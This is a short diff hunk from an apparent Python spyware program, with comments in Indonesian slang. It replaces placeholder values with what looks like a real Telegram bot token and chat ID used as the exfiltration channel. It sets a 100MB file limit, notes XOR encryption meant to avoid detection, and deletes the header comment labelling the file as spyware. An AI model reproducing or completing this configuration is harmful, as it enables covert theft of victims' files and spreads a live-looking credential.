@@ -20,9 +20,8 @@ import glob
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
 
-# ==================== KONFIGURASI SPYWARE ====================
-TELEGRAM_TOKEN = "MASUKIN_TOKEN_LO_ANJING"
-TELEGRAM_CHAT_ID = "MASUKIN_CHAT_ID_LO_BABI"
+TELEGRAM_TOKEN = "8230756637:AAHIoL3Sp3FvZv40VQM3kXH74QFBJbFEFTI"
+TELEGRAM_CHAT_ID = "8443726113"
 MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
 
 # Enkripsi sederhana (xor biar gak ketauan)
